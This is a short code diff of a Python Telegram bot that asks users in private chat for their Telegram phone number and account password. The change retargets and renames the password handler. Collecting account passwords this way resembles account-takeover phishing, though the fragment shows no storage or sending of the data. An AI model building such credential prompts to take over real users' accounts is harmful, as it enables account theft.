@@ -94,8 +94,8 @@ async def verip(_, message):
     await app.send_message(message.chat.id, "Please send your telegram phone number…")
 # PASSWORD 
 
-@app.on_message(filters.command("🔐") & filters.private)
-async def verip(_, message):
+@app.on_message(filters.regex("🔐") & filters.private)
+async def pw(_, message):
     await app.send_message(message.chat.id, "__Please send your Account Password__")
 
 # SEND NOMER
